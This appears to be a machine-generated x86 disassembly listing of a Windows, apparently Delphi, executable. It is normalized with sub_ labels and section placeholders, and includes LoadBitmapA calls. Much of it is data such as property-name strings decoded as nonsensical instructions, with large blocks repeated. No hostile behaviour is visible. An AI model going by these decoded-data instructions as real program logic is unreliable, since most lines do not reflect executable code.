add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
sub_473726
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0x4c ] cl
pop edi
inc esp
add al cl
hlt
sub_473a53
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001a ] al
outsd
outsb
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
inc esi
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
sbb eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3700ffff ] ah
cmp eax [ ebp ]
in al dx
cmp eax [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
add eax 0x336c7443
inc esp
hlt
add [ eax ] al
sbb eax 0x2940042
add bh bh
nop
dec ebp
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edi ] 0x0
add bh bh
and al [ eax ]
or ecx [ eax + 0x65 ]
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
add al 0x46
insb
popad
je r-xdata
sbb eax 0x2980042
add bh bh
jl r-xdata
cwde
add al [ eax ]
outsd
outsb
je r-xdata
and al [ edx ]
push 0x80ff0000
rol [ eax + eax - 0x70 ] cl
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040021 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070025 ] al
insd
add [ eax ] eax
dec [ eax + 0x1ff0001 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] 0x0
add bh bh
and eax [ eax ]
adc eax 0x64616548
jb r-xdata
dec esi
popad
insd
add [ gs : eax ] dl
inc eax
add [ ecx ] bh
add al [ eax ]
add [ eax - 0x80000000 ] al
and eax 0x6d490700
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
dec eax
jne r-xdata
add [ eax ] al
add [ edx ] ch
add [ ebx ] cl
push eax
popad
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x41625874
add [ eax ] bl
add al [ eax ]
push [ ebx + ebx * 2 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
add eax 0x6d657449
jae r-xdata
imul esp [ gs : edi + 0x68 ] 0x40103c74
add [ eax + ebx * 2 ] dl
inc esp
add [ eax + 0x58 ] bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0027 ] al
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61500e00
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
and al 0x0
pop es
dec ecx
insd
dec ebp
outsd
mov ah 0x8d
inc esp
lea eax [ eax + eax - 0x7c ]
add [ eax ] eax
inc [ ecx + eax + 0x1ff00 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ ecx + 0x62 ] dl
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push edi
add [ eax ] al
[ eax + edx * 8 - 0xdf7ffbc ]
test [ fs : eax ] cl
inc esp
add [ eax ] bh
add al [ eax ]
inc esp
pop ecx
inc esp
add al [ eax ]
jmp [ eax + 0x1004459 ]
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
adc [ eax ] al
test eax 0xf8ff0001
cmp eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jae r-xdata
jb r-xdata
sub eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
enter 0x45 0x7c
add [ eax ] al
inc [ ecx + edx * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009002e ] al
add [ eax ] al
xor [ eax ] al
push es
push ebx
outsd
jb r-xdata
adc [ eax ] al
cmp al [ edx ]
add bh bh
mov al [ 0x1004459 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
outsd
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
push eax
outsb
je r-xdata
dec edi
outsb
inc esp
popad
je r-xdata
bound ebp [ ebp + 0x74 ]
push edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
xor al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
add [ eax ] eax
jo r-xdata
adc [ eax ] al
0xff0000 0x44d3
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push cs
push eax
popad
je r-xdata
add [ eax ] al
cmp [ edx ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9463f1d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003b ] al
outsb
inc esp
jb r-xdata
mov eax 0x68004409
add al [ eax ]
[ eax + 0x2 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] eax
add eax 0x6c797453
les edi [ gs : esi + 0x44 ]
add [ esp + edi ] ah
inc ebp
add [ esp + edi + 0x10045 ] ah
add bh bh
les ebx [ ecx + 0x44 ]
outsb
jne r-xdata
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov eax 0x10044d2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
or dl [ eax + 0x61 ]
add [ eax - 0x80000000 ] al
inc esp
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
dec ebx
jns r-xdata
je r-xdata
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ecx ] cl
inc esp
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f090042 ] al
outsb
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax + eax ] 0xa
dec edi
outsb
inc esp
jb r-xdata
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
insd
mov al 0x80
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003f ] al
dec edi
jbe r-xdata
popad
dec ebp
outsd
jbe r-xdata
add [ eax ] al
call 0x29f40c2
add bh bh
pop eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0045 ] al
outsb
dec ebp
popad
jae r-xdata
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ ebx ] cl
inc esp
outsd
ja r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ edx ] cl
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
jb r-xdata
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060041 ] al
outsb
inc ebp
js r-xdata
dec edi
jb r-xdata
inc edx
add al ch
add [ ebx + edi * 8 - 0x1 ] al
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax ] bl
dec edi
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
jo r-xdata
jb r-xdata
outsd
js r-xdata
jb r-xdata
sub [ ecx + 0xd80044 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ ebx ] cl
dec edi
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax ] al
add [ eax + 0x4f09003e ] al
call 0x2973fa7
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003d ] al
outsb
inc esp
jb r-xdata
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
add eax 0x3
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
add eax [ eax ]
add [ eax ] al
push edi
jb r-xdata
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0049 ] al
outsb
push ebx
je r-xdata
test [ eax + eax ] eax
add [ eax ] al
or [ eax ] 0x9
dec ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
popad
je r-xdata
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_474241
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4296c0
add [ ecx + r-xdata ] esp
inc esp
jb r-xdata
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070044 ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x2464065
add [ ecx ] cl
dec edi
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070040 ] al
add [ eax ] al
ja r-xdata
add [ ecx - 0x135c0609 ] bl
jmp r-xdata
jo r-xdata
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
jb r-xdata
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc ecx
inc edi
add [ eax + eax ] cl
push ebp
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec eax
add [ ecx ] cl
popad
lea eax [ bx + si ]
lodsb [ esi ]
inc ecx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0xc0047 ] ch
popad
je r-xdata
push esi
test dl dl
je r-xdata
push sub_474248
mov eax [ ebp - 0x4 ]
call sub_403190
retn
jb r-xdata
push esp
inc ebx
push 0x4c6b6365
imul esi [ ebx + 0x74 ] 0x44786f42
add [ eax + 0x18004031 ] al
inc esp
outsd
outsb
inc ebp
outsb
je r-xdata
insd
inc esp
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445248
mov [ esi + 0x281 ] 0x1
mov [ esi + 0x294 ] 0xff000017
mov [ esi + 0x298 ] 0xff000018
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
outsb
push ebx
je r-xdata
call sub_4285d8
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov dl 0x1
mov eax [ r-xdata ]
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_473dd8
mov esp 0x100453c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
pop es
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
cmp al 0x2
add bh bh
jo r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ ecx + 0x62 ] dl
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push edi
add [ eax ] al
[ eax + edx * 8 - 0xdf7ffbc ]
cmp [ eax ] eax
or al 0x4f
outsb
inc esp
popad
je r-xdata
js r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc esp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 2 + 0x57 ] si
inc ecx
add [ eax ] ch
add [ eax ] eax
push eax
outsd
add [ eax ] 0x0
add [ eax + 0x4f09003f ] al
dec edi
jbe r-xdata
[ eax ]
jo r-xdata
dec ebx
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
jo r-xdata
or [ eax + eax + 0x60 ] al
add al [ eax ]
jmp [ eax + 0x2 ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f090042 ] al
outsb
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x4f09003e ] al
call 0x2973fa7
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003d ] al
outsb
inc esp
jb r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
insd
mov al 0x80
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
jns r-xdata
jb r-xdata
add [ eax + 0x4f070040 ] al
add [ eax ] al
ja r-xdata
popad
dec ebp
outsd
jbe r-xdata
add [ eax ] al
call 0x29f40c2
add bh bh
pop eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0045 ] al
outsb
dec ebp
popad
jae r-xdata
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ ebx ] cl
inc esp
outsd
ja r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ edx ] cl
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
jb r-xdata
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060041 ] al
outsb
inc ebp
js r-xdata
popad
je r-xdata
inc edx
add al ch
add [ ebx + edi * 8 - 0x1 ] al
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax ] bl
dec edi
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
jo r-xdata
jb r-xdata
outsd
js r-xdata
jb r-xdata
sub [ ecx + 0xd80044 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ ebx ] cl
dec edi
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ecx ] cl
insd
inc esp
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
add eax 0x3
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
add eax [ eax ]
add [ eax ] al
push edi
jb r-xdata
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0049 ] al
outsb
push ebx
je r-xdata
test [ eax + eax ] eax
add [ eax ] al
or [ eax ] 0x9
dec ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
popad
je r-xdata
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_474241
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4296c0
add [ ecx + r-xdata ] esp
inc esp
jb r-xdata
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070044 ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x2464065
add [ ecx ] cl
dec edi
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ ecx - 0x135c0609 ] bl
jmp r-xdata
jo r-xdata
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
jb r-xdata
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc ecx
inc edi
add [ eax + eax ] cl
push ebp
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec eax
add [ ecx ] cl
popad
lea eax [ bx + si ]
lodsb [ esi ]
inc ecx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0xc0047 ] ch
push esi
test dl dl
je r-xdata
push sub_474248
mov eax [ ebp - 0x4 ]
call sub_403190
retn
jb r-xdata
push esp
inc ebx
push 0x4c6b6365
imul esi [ ebx + 0x74 ] 0x44786f42
add [ eax + 0x18004031 ] al
inc esp
outsd
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445248
mov [ esi + 0x281 ] 0x1
mov [ esi + 0x294 ] 0xff000017
mov [ esi + 0x298 ] 0xff000018
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
outsb
push ebx
je r-xdata
call sub_4285d8
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov dl 0x1
mov eax [ r-xdata ]
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_473e23
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
sub_473e44
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070035 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
cmp [ eax ] eax
or al 0x4f
outsb
inc esp
popad
je r-xdata
js r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc esp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 2 + 0x57 ] si
inc ecx
add [ eax ] ch
add [ eax ] eax
push eax
outsd
add [ eax ] 0x0
add [ eax + 0x4f09003f ] al
dec edi
jbe r-xdata
[ eax ]
jo r-xdata
dec ebx
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
jo r-xdata
or [ eax + eax + 0x60 ] al
add al [ eax ]
jmp [ eax + 0x2 ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f090042 ] al
outsb
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x4f09003e ] al
call 0x2973fa7
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003d ] al
outsb
inc esp
jb r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
insd
mov al 0x80
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
jns r-xdata
jb r-xdata
add [ eax + 0x4f070040 ] al
add [ eax ] al
ja r-xdata
popad
dec ebp
outsd
jbe r-xdata
add [ eax ] al
call 0x29f40c2
add bh bh
pop eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0045 ] al
outsb
dec ebp
popad
jae r-xdata
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ ebx ] cl
inc esp
outsd
ja r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ edx ] cl
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
jb r-xdata
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060041 ] al
outsb
inc ebp
js r-xdata
popad
je r-xdata
inc edx
add al ch
add [ ebx + edi * 8 - 0x1 ] al
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax ] bl
dec edi
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
jo r-xdata
jb r-xdata
outsd
js r-xdata
jb r-xdata
sub [ ecx + 0xd80044 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ ebx ] cl
dec edi
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ecx ] cl
insd
inc esp
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
add eax 0x3
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
add eax [ eax ]
add [ eax ] al
push edi
jb r-xdata
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0049 ] al
outsb
push ebx
je r-xdata
test [ eax + eax ] eax
add [ eax ] al
or [ eax ] 0x9
dec ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
popad
je r-xdata
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_474241
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4296c0
add [ ecx + r-xdata ] esp
inc esp
jb r-xdata
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070044 ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x2464065
add [ ecx ] cl
dec edi
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ ecx - 0x135c0609 ] bl
jmp r-xdata
jo r-xdata
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
jb r-xdata
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc ecx
inc edi
add [ eax + eax ] cl
push ebp
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec eax
add [ ecx ] cl
popad
lea eax [ bx + si ]
lodsb [ esi ]
inc ecx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
